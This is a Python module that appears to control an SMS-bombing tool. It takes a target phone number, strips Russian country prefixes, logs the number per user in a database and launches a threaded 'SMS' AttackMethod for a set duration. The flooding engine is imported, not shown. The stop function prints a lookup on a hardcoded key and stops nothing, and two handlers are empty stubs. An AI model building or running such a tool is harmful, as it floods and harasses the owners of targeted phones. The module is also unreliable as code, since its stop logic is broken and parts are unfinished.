

from processing.start_ddos import AttackMethod
from sql.ddosnumberlist_table import add_number

ddos_dict = dict()
ddos_threads_dict = dict()

def call_ddos_number(user_id: str, number: str, time: int, threads: int):
    pr_number = parse_number(number)
    add_number(user_id, pr_number)
    ddos_dict.update({f'{user_id}': {
        f'{pr_number}': AttackMethod(name='SMS', duration=time, threads=threads, target=pr_number)
        }
    })
    ddos_dict.get(user_id)[pr_number].Start()


def stop_ddos_number(user_id: str, number: str):
    print(ddos_dict.get(42141))


def process_bl(user_id, command: str, number: str):
    # todo
    pass


def send_info(user_id, command: str):
    # todo
    pass


def parse_number(number: str) -> str:
    if number.startswith('+7'):
        return number[2:]
    if number.startswith('8') and len(number) >= 11:
        return number[1:]
    else:
        return number
